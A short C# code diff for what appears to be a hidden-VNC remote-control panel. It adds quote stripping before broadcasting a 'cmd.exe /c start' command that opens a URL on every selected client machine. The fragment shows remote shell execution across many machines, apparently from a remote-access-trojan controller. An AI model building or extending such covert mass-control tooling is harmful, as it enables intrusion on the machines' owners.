@@ -161,7 +161,8 @@ public partial class HvncBroadcastWindow : Window
     {
         var url = TxtUrl.Text.Trim();
         if (string.IsNullOrEmpty(url)) return;
-        // Open via default browser shortcut: start "" "url"
+        // Strip any embedded quotes to prevent command injection via cmd /c start
+        url = url.Replace("\"", "").Replace("'", "");
         await SendExecToAll($@"cmd.exe /c start """" ""{url}""");
         AddLog($"[🌐] URL opened on {SelectedIds.Count()} client(s): {url}");
     }
